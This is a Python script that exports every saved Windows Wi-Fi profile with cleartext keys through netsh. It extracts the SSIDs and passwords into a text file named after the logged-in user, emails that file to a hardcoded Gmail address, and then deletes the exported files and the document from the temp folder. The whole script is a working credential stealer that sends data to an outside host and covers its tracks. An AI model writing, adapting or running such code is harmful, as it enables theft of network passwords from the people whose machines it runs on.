import os,subprocess,tempfile,smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from dotenv import load_dotenv


load_dotenv()

def file_extractor():
    path = os.getcwd()
    command = ["netsh", "wlan", "export", "profile", "key=clear"]
    subprocess.run(command,shell=True, capture_output=True).stdout.decode()
    return path


def append_file(path):
    wifi_file=[]
    for files in os.listdir(path):
        if files.startswith("Wi-Fi") and files.endswith(".xml"):
            wifi_file.append(files)
    return wifi_file


def zipping_ssid_password(file):
    wifi_id=[]
    wifi_password=[]
    for sub_file in file:
        with open(sub_file,"r",encoding='utf-8') as f:
            for line in f.readlines()[3:]:
                if "<name>" in line:
                    line.strip()
                    name=line[9:-8]
                    wifi_id.append(name)
                if "keyMaterial" in line:
                    line.strip()
                    password = line[17:-15]
                    wifi_password.append(password)
    zip_file = zip(wifi_id,wifi_password)
    return zip_file


def make_doc(zip_file):
    path = os.getcwd()
    username =  os.getlogin()
    filename = "wi_fi_password_"+username+".txt"
    for file in os.listdir(path):
        if file.startswith("wi_fi_password") and file.endswith(".txt"):
            os.remove(path+"\\"+file)

    for id,pwd in zip_file:
        with open(filename,"a") as doc:
            doc.write(f"SSID: {id} --------------- Password: {pwd}\n")

    return doc.name


def send_email(document):
    # Sender and receiver information
    sender_email = "akjani2311@gmail.com"
    sender_password = os.getenv("GMAIL_APP_PASSWORD")
    receiver_email = "akjani2311@gmail.com"

    # Create a message object
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = "Email with Attachment"

    # Add body text to the email
    body = "This email contains an attachment."
    message.attach(MIMEText(body, "plain"))

    # Attach the file to the email
    filename = document
    with open(filename, "rb") as f:
        attachment = MIMEApplication(f.read(), _subtype="txt")
        attachment.add_header("Content-Disposition", "attachment", filename=filename)
        message.attach(attachment)

    try:
        # Create the SMTP server and login
        smtp_server = "smtp.gmail.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)

        # Send the email and close the connection
        text = message.as_string()
        server.sendmail(sender_email, receiver_email, text)

    except Exception as e:
        print(e)

    finally:
        server.quit()

# deleting all the extracted file
def delete_files(path):
    os.chdir(path)
    for file in os.listdir(path):
        if file.startswith("Wi-Fi") and file.endswith(".xml"):
            os.remove(path+"\\"+file)

def execute():
    # changing directory to temp directory now every action will be perform in temp directory
    temp_directory = tempfile.gettempdir()
    os.chdir(temp_directory)
    path = file_extractor()
    list_wifi = append_file(path)
    zip_file = zipping_ssid_password(list_wifi)
    # making document of extracted ssid and password
    document = make_doc(zip_file)
    # getting the file via mail
    send_email(document)
    # deleting extracted file after extracting ssid and password
    delete_files(path)
    # finnaly removing document
    os.remove(document)
